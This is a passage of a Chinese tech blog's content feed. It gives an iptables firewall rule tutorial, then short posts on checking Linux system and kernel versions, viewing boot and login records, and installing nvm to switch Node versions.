<span class="line">-s 匹配来源地址IP/MASK，加叹号<span class="string">"!"</span>表示除这个IP外。</span>
<span class="line">-d 匹配目标地址</span>
<span class="line">-i 网卡名称 匹配从这块网卡流入的数据</span>
<span class="line">-o 网卡名称 匹配从这块网卡流出的数据</span>
<span class="line">-p 匹配协议,如tcp,udp,icmp</span>
<span class="line">--dport num 匹配目标端口号</span>
<span class="line">--sport num 匹配来源端口号</span>
</pre></td></tr></table></figure>

<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a><a href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A" title="示例："></a>示例：</h2><h3 id="删除已有规则："><a href="#删除已有规则：" class="headerlink" title="删除已有规则："></a><a href="#%E5%88%A0%E9%99%A4%E5%B7%B2%E6%9C%89%E8%A7%84%E5%88%99%EF%BC%9A" title="删除已有规则："></a>删除已有规则：</h3><p>在建立新的规则前，可能需要删除旧的规则，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -F  (or) iptables -flush</span>
</pre></td></tr></table></figure>

<h3 id="设置链的默认规则："><a href="#设置链的默认规则：" class="headerlink" title="设置链的默认规则："></a><a href="#%E8%AE%BE%E7%BD%AE%E9%93%BE%E7%9A%84%E9%BB%98%E8%AE%A4%E8%A7%84%E5%88%99%EF%BC%9A" title="设置链的默认规则："></a>设置链的默认规则：</h3><p>所有链的默认规则为”ACCEPT”，若需将其它链(INPUT、FORWARD、OUTPUT)设置成”DROP”（拒绝），命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -P INPUT DROP</span>
<span class="line">$ iptables -P FORWARD DROP</span>
<span class="line">$ iptables -P OUTPUT DROP</span>
</pre></td></tr></table></figure>

<h3 id="拒绝指定ip地址："><a href="#拒绝指定ip地址：" class="headerlink" title="拒绝指定ip地址："></a><a href="#%E6%8B%92%E7%BB%9D%E6%8C%87%E5%AE%9Aip%E5%9C%B0%E5%9D%80%EF%BC%9A" title="拒绝指定ip地址："></a>拒绝指定ip地址：</h3><p>当发现某个ip的异常连接，可以使用该命令阻止该地址的连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -s x.x.x.x -j drop</span>
</pre></td></tr></table></figure>

<p>对特定网卡的使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -i eth0 -s x.x.x.x -j DROP</span>
<span class="line">$ iptables -A INPUT -i eth0 -p tcp -s x.x.x.x -j DROP</span>
</pre></td></tr></table></figure>

<h3 id="允许所有SSH的连接："><a href="#允许所有SSH的连接：" class="headerlink" title="允许所有SSH的连接："></a><a href="#%E5%85%81%E8%AE%B8%E6%89%80%E6%9C%89SSH%E7%9A%84%E8%BF%9E%E6%8E%A5%EF%BC%9A" title="允许所有SSH的连接："></a>允许所有SSH的连接：</h3><p>允许所有外部的ssh连接，且只允许eth0接口目标端口为22的数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="仅允许指定网络的SSH连接请求："><a href="#仅允许指定网络的SSH连接请求：" class="headerlink" title="仅允许指定网络的SSH连接请求："></a><a href="#%E4%BB%85%E5%85%81%E8%AE%B8%E6%8C%87%E5%AE%9A%E7%BD%91%E7%BB%9C%E7%9A%84SSH%E8%BF%9E%E6%8E%A5%E8%AF%B7%E6%B1%82%EF%BC%9A" title="仅允许指定网络的SSH连接请求："></a>仅允许指定网络的SSH连接请求：</h3><p>例如允许来自于192.168.1.0&#x2F;24域的用户的ssh连接请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp -s 192.168.1.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许http或https的连接请求："><a href="#允许http或https的连接请求：" class="headerlink" title="允许http或https的连接请求："></a><a href="#%E5%85%81%E8%AE%B8http%E6%88%96https%E7%9A%84%E8%BF%9E%E6%8E%A5%E8%AF%B7%E6%B1%82%EF%BC%9A" title="允许http或https的连接请求："></a>允许http或https的连接请求：</h3><p>允许所有的http请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>允许所有的https请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许本地发起的ssh请求："><a href="#允许本地发起的ssh请求：" class="headerlink" title="允许本地发起的ssh请求："></a><a href="#%E5%85%81%E8%AE%B8%E6%9C%AC%E5%9C%B0%E5%8F%91%E8%B5%B7%E7%9A%84ssh%E8%AF%B7%E6%B1%82%EF%BC%9A" title="允许本地发起的ssh请求："></a>允许本地发起的ssh请求：</h3><p>注意这与允许ssh连入的区别</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="仅允许从本地发起到一个指定的网络的SSH请求："><a href="#仅允许从本地发起到一个指定的网络的SSH请求：" class="headerlink" title="仅允许从本地发起到一个指定的网络的SSH请求："></a><a href="#%E4%BB%85%E5%85%81%E8%AE%B8%E4%BB%8E%E6%9C%AC%E5%9C%B0%E5%8F%91%E8%B5%B7%E5%88%B0%E4%B8%80%E4%B8%AA%E6%8C%87%E5%AE%9A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9A%84SSH%E8%AF%B7%E6%B1%82%EF%BC%9A" title="仅允许从本地发起到一个指定的网络的SSH请求："></a>仅允许从本地发起到一个指定的网络的SSH请求：</h3><p>例如仅允许从内部连接到网域192.168.1.0&#x2F;24</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp -d 192.168.1.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许从本地发起的HTTPS连接请求："><a href="#允许从本地发起的HTTPS连接请求：" class="headerlink" title="允许从本地发起的HTTPS连接请求："></a><a href="#%E5%85%81%E8%AE%B8%E4%BB%8E%E6%9C%AC%E5%9C%B0%E5%8F%91%E8%B5%B7%E7%9A%84HTTPS%E8%BF%9E%E6%8E%A5%E8%AF%B7%E6%B1%82%EF%BC%9A" title="允许从本地发起的HTTPS连接请求："></a>允许从本地发起的HTTPS连接请求：</h3><p>如果你想允许用户访问互联网，该规则能是用户发出安全的web流量请求，且能使用wget下载外部文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>如果需要允许http请求，只需将443改为80即可</p>
<h3 id="使用multiport-将多个规则结合起来："><a href="#使用multiport-将多个规则结合起来：" class="headerlink" title="使用multiport 将多个规则结合起来："></a><a href="#%E4%BD%BF%E7%94%A8multiport-%E5%B0%86%E5%A4%9A%E4%B8%AA%E8%A7%84%E5%88%99%E7%BB%93%E5%90%88%E8%B5%B7%E6%9D%A5%EF%BC%9A" title="使用multiport 将多个规则结合起来："></a>使用multiport 将多个规则结合起来：</h3><p>为了减少为每个端口都写一条独立规则的麻烦，可以使用multiport组合成一条规则。<br>例如允许所有ssh,http,https的流量访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许外部ping内部主机："><a href="#允许外部ping内部主机：" class="headerlink" title="允许外部ping内部主机："></a><a href="#%E5%85%81%E8%AE%B8%E5%A4%96%E9%83%A8ping%E5%86%85%E9%83%A8%E4%B8%BB%E6%9C%BA%EF%BC%9A" title="允许外部ping内部主机："></a>允许外部ping内部主机：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -p icmp --icmp-type <span class="built_in">echo</span>-request -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -p icmp --icmp-type <span class="built_in">echo</span>-reply   -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许内部ping外部主机："><a href="#允许内部ping外部主机：" class="headerlink" title="允许内部ping外部主机："></a><a href="#%E5%85%81%E8%AE%B8%E5%86%85%E9%83%A8ping%E5%A4%96%E9%83%A8%E4%B8%BB%E6%9C%BA%EF%BC%9A" title="允许内部ping外部主机："></a>允许内部ping外部主机：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -p icmp --icmp-type <span class="built_in">echo</span>-request -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -p icmp --icmp-type <span class="built_in">echo</span>-reply -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许回环访问："><a href="#允许回环访问：" class="headerlink" title="允许回环访问："></a><a href="#%E5%85%81%E8%AE%B8%E5%9B%9E%E7%8E%AF%E8%AE%BF%E9%97%AE%EF%BC%9A" title="允许回环访问："></a>允许回环访问：</h3><p>在本地可以访问127.0.0.1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -i lo -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o lo -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="负载平衡传入的网络流量："><a href="#负载平衡传入的网络流量：" class="headerlink" title="负载平衡传入的网络流量："></a><a href="#%E8%B4%9F%E8%BD%BD%E5%B9%B3%E8%A1%A1%E4%BC%A0%E5%85%A5%E7%9A%84%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%EF%BC%9A" title="负载平衡传入的网络流量："></a>负载平衡传入的网络流量：</h3><p>使用iptables可以实现传入web流量的负载均衡<br>例如使用iptables nth将HTTPS流量负载平衡至三个不同的ip地址。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.11:443</span>
<span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.12:443</span>
<span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.13:443</span>
</pre></td></tr></table></figure>

<h3 id="允许出站的DNS查询请求："><a href="#允许出站的DNS查询请求：" class="headerlink" title="允许出站的DNS查询请求："></a><a href="#%E5%85%81%E8%AE%B8%E5%87%BA%E7%AB%99%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E8%AF%B7%E6%B1%82%EF%BC%9A" title="允许出站的DNS查询请求："></a>允许出站的DNS查询请求：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -p udp -i eth0 --sport 53 -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许内部网络域和外部网络通信："><a href="#允许内部网络域和外部网络通信：" class="headerlink" title="允许内部网络域和外部网络通信："></a><a href="#%E5%85%81%E8%AE%B8%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E5%9F%9F%E5%92%8C%E5%A4%96%E9%83%A8%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%EF%BC%9A" title="允许内部网络域和外部网络通信："></a>允许内部网络域和外部网络通信：</h3><p>如果防火墙上有两个网卡：eth1连接到外部网络(互联网)，eth0连接到内部网络(例如:192.168.1.x)。<br>使用以下规则允许内部网络与外部网络的通信</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许来自指定网络的rsync请求："><a href="#允许来自指定网络的rsync请求：" class="headerlink" title="允许来自指定网络的rsync请求："></a><a href="#%E5%85%81%E8%AE%B8%E6%9D%A5%E8%87%AA%E6%8C%87%E5%AE%9A%E7%BD%91%E7%BB%9C%E7%9A%84rsync%E8%AF%B7%E6%B1%82%EF%BC%9A" title="允许来自指定网络的rsync请求："></a>允许来自指定网络的rsync请求：</h3><p>多数情况MySQL和web服务在同一台服务器上，现在我们仅希望某些人员从内部网络(192.168.1.0&#x2F;24)登陆数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -i eth0 -p tcp -s 192.168.1.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许Sendmail-Postfix邮件服务："><a href="#允许Sendmail-Postfix邮件服务：" class="headerlink" title="允许Sendmail, Postfix邮件服务："></a><a href="#%E5%85%81%E8%AE%B8Sendmail-Postfix%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%EF%BC%9A" title="允许Sendmail, Postfix邮件服务："></a>允许Sendmail, Postfix邮件服务：</h3><p>Sendmail和postfix都使用了25端口，因此只需允许来自25端口的连接请求即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许IMAP和IMAPS："><a href="#允许IMAP和IMAPS：" class="headerlink" title="允许IMAP和IMAPS："></a><a href="#%E5%85%81%E8%AE%B8IMAP%E5%92%8CIMAPS%EF%BC%9A" title="允许IMAP和IMAPS："></a>允许IMAP和IMAPS：</h3><p>例如允许IMAP&#x2F;IMAP2流量，端口为143</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>例如允许IMAPS流量，端口为993</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许POP3和POP3S访问："><a href="#允许POP3和POP3S访问：" class="headerlink" title="允许POP3和POP3S访问："></a><a href="#%E5%85%81%E8%AE%B8POP3%E5%92%8CPOP3S%E8%AE%BF%E9%97%AE%EF%BC%9A" title="允许POP3和POP3S访问："></a>允许POP3和POP3S访问：</h3><p>例如允许POP3</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>例如允许POP3S访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="防止Dos攻击："><a href="#防止Dos攻击：" class="headerlink" title="防止Dos攻击："></a><a href="#%E9%98%B2%E6%AD%A2Dos%E6%94%BB%E5%87%BB%EF%BC%9A" title="防止Dos攻击："></a>防止Dos攻击：</h3><p>命令如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 25/minute --<span class="built_in">limit</span>-burst 100 -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>参数解释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
</pre></td><td class="code"><pre><span class="line">-m limit: 启用limit扩展</span>
<span class="line">–limit 25/minute: 允许最多每分钟25个连接（根据需求更改）。</span>
<span class="line">–limit-burst 100: 只有当连接达到limit-burst水平(此例为100)时才启用上述limit/minute限制。</span>
</pre></td></tr></table></figure>

<h3 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a><a href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%9A" title="端口转发："></a>端口转发：</h3><p>将来自422端口的流量全部转到22端口。<br>这样我们既能通过422端口也能通过22端口进行ssh连接，启用DNAT转发。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -t nat -A PREROUTING -p tcp -d 192.168.1.37 --dport 422 -j DNAT --to 192.168.1.37:22</span>
</pre></td></tr></table></figure>

<p>还需要允许连接到442端口的请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="记录丢弃的数据包"><a href="#记录丢弃的数据包" class="headerlink" title="记录丢弃的数据包"></a><a href="#%E8%AE%B0%E5%BD%95%E4%B8%A2%E5%BC%83%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85" title="记录丢弃的数据包"></a>记录丢弃的数据包</h3><p>1、新建一个链名为loging</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -N loging</span>
</pre></td></tr></table></figure>

<p>2、将所有来自INPUT链的数据包跳转到loging链中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -j loging</span>
</pre></td></tr></table></figure>

<p>3、为这些包自定义前缀，命为‘iptables packet dropped’</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A loging -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/min -j LOG --<span class="built_in">log</span>-prefix <span class="string">"iptables packet dropped: "</span> --<span class="built_in">log</span>-level 7</span>
</pre></td></tr></table></figure>

<p>4、丢弃这些数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A loging -j DROP</span>
</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 查看硬件架构|系统版本|内核版本</title>
    <url>/2020/linux%E7%89%88%E6%9C%AC.html</url>
    <content><![CDATA[<p><font color=green>有时候,我们可能需要获取Linux系统的一些关键信息,以下列举了部分常用的命令做为备忘📝</font></p>
<h3 id="一、查看系统架构"><a href="#一、查看系统架构" class="headerlink" title="一、查看系统架构"></a>一、查看系统架构</h3><ul>
<li><strong>hostnamectl</strong> 工具是用来管理给定主机中使用的三种类型的主机名，可以提供有关你的机器的最基本的信息。</li>
</ul>
<p><code>hostnamectl status</code></p>
<img src="../images/upload/hostnamectl.png" alt="hostnamectl" style="zoom:50%;" />

<span id="more"></span>

<ul>
<li><p><strong>lscpu</strong>命令从sysfs和&#x2F;proc&#x2F;cpuinfo收集cpu体系结构信息，命令的输出比较易读，命令输出的信息包含cpu数量，线程，核数，套接字等。</p>
<img src="../images/upload/lscpu.png" style="zoom:50%;" />
</li>
<li><p><strong>arch</strong>命令主要用于显示当前主机的硬件结构类型，arch命令输出的结果有：i386、i486、mips、alpha等。</p>
<img src="../images/upload/arch.png" style="zoom: 67%;" />
</li>
<li><p><strong>uname</strong>命令的英文全称即“Unix name”，用于显示系统相关信息，比如主机名、内核版本号、硬件架构等。<br>-m 显示计算机硬件架构；-i  显示硬件平台</p>
<img src="../images/upload/uname1.png" style="zoom: 67%;" /></li>
</ul>
<h3 id="二、查看系统发行版本"><a href="#二、查看系统发行版本" class="headerlink" title="二、查看系统发行版本"></a>二、查看系统发行版本</h3><ul>
<li><p><strong>LSB</strong>是Linux Standard Base的缩写，lsb_release命令用来显示LSB和特定版本的相关信息。如果使用该命令时不带参数，则默认加上-v参数。</p>
<p>-d 显示系统全称和版本号；-a  显示LSB所有信息</p>
<img src="../images/upload/lsb_release.png" style="zoom:50%;" />
</li>
<li><p><strong>&#x2F;etc&#x2F;*-release</strong>文件通常被视为操作系统的标识。在 <code>/etc</code> 目录下放置了很多记录着发行版各种信息的文件，每个发行版都各自有一套这样记录着相关信息的文件。</p>
<p>其中 <code>/etc/redhat-release</code> 和 <code>/etc/system-release</code>,<code>/etc/os-release</code> 文件是指向 <code>/etc/[发行版名称]-release</code> 文件的一个连接。</p>
<img src="../images/upload/cat1.png" style="zoom:50%;" /></li>
</ul>
<h3 id="三、查看内核版本"><a href="#三、查看内核版本" class="headerlink" title="三、查看内核版本"></a>三、查看内核版本</h3><ul>
<li><p><strong>uname</strong>用于显示系统相关信息，比如主机名、内核版本号、硬件架构等。</p>
<p>-r 显示当前系统的内核版本; -s 显示内核名称</p>
<img src="../images/upload/uname2.png" style="zoom: 67%;" />
</li>
<li><p><strong>&#x2F;proc&#x2F;version</strong>文件记录了 Linux 内核的版本、用于编译内核的 gcc 的版本、内核编译的时间，以及内核编译者的用户名。</p>
<p><img src="/../images/upload/proc.png"></p>
</li>
<li><p><strong>dmesg</strong>（展示信息display message 或驱动程序信息driver message）是大多数类 Unix 操作系统上的一个命令，用于打印内核的消息缓冲区的信息。</p>
<p><img src="/../images/upload/dmesg.png"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>Linux开机和关机记录查看</title>
    <url>/2021/linux%E8%AE%B0%E5%BD%95%E6%9F%A5%E7%9C%8B.html</url>
    <content><![CDATA[<h3 id="查看最近一次开机时间"><a href="#查看最近一次开机时间" class="headerlink" title="查看最近一次开机时间"></a>查看最近一次开机时间</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">who</span> -b</span><br><span class="line">或者</span><br><span class="line">&gt; last -1 reboot</span><br></pre></td></tr></table></figure>

<h3 id="查看关机记录"><a href="#查看关机记录" class="headerlink" title="查看关机记录"></a>查看关机记录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; last -x | grep shutdown <span class="comment">#以关机时间段显示</span></span><br></pre></td></tr></table></figure>

<h3 id="查看失败登录记录-来源以IP显示"><a href="#查看失败登录记录-来源以IP显示" class="headerlink" title="查看失败登录记录, 来源以IP显示"></a><span id="more"></span>查看失败登录记录, 来源以IP显示</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; sudo lastb -i</span><br></pre></td></tr></table></figure>

<h3 id="查看系统从上次开机到现在已经运行多久了"><a href="#查看系统从上次开机到现在已经运行多久了" class="headerlink" title="查看系统从上次开机到现在已经运行多久了"></a>查看系统从上次开机到现在已经运行多久了</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">uptime</span></span><br><span class="line">或者</span><br><span class="line">&gt; w</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>快速切换Node版本</title>
    <url>/2022/node%E7%89%88%E6%9C%AC.html</url>
    <content><![CDATA[<p>Hexo在使用高版本Node时，会造成Hexo上传报错，而且上传后的项目也可能出现空白页；目前hexo不支持高版本，只能通过降级解决问题。 所以使用到Node版本的切换控制管理。</p>
<h3 id="一：卸载旧版Node。"><a href="#一：卸载旧版Node。" class="headerlink" title="一：卸载旧版Node。"></a>一：卸载旧版Node。</h3><p>将电脑现在装的node进行卸载，最好是删除所有关于node的文件及内容<span id="more"></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew uninstall node@xx</span><br></pre></td></tr></table></figure>

<h3 id="二：安装nvm"><a href="#二：安装nvm" class="headerlink" title="二：安装nvm"></a>二：安装nvm</h3><p>通过Github服务器<span class="exturl" data-url="aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz1GSjZWdXI5NTZoTHhVaWF5YzdwSXRRPT0uaGlKTUt3NTF6R1BJcS9yajA3SzRDNWdxQlBaMEEvaEVabFlzRzRYMzkyZTJmbmRwQWlwMWRlMzZhK0l5Y1FvemJ6dm1hREt5aEkzdTJNOWZlSVBWUVE9PQ==">下载安装<i class="fa fa-external-link-alt"></i></span></p>
<p>下载完成后，按照安装操作一步一步安装就好了，很简单。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nvm-noinstall.<span class="built_in">zip</span>： 这个是绿色免安装版本，但是使用之前需要配置</span><br><span class="line">nvm-setup.<span class="built_in">zip</span>：这是一个安装包，下载之后点击安装，无需配置就可以使用，方便。</span><br><span class="line">Source code(.<span class="built_in">zip</span>)：<span class="built_in">zip</span>压缩的源码</span><br><span class="line">Sourc code(tar.gz)：tar.gz的源码，一般用于Linux系统</span><br><span class="line">⚠️建议下载nvm-setup.<span class="built_in">zip</span>版本⚠️</span><br></pre></td></tr></table></figure>

<h3 id="三：测试nvm是否安装成功"><a href="#三：测试nvm是否安装成功" class="headerlink" title="三：测试nvm是否安装成功"></a>三：测试nvm是否安装成功</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在命令行中输入</span></span><br><span class="line">$ nvm -v  </span><br><span class="line"><span class="number">0.39</span><span class="number">.0</span></span><br><span class="line"><span class="comment">//出现版本号，说明安装成功</span></span><br></pre></td></tr></table></figure>

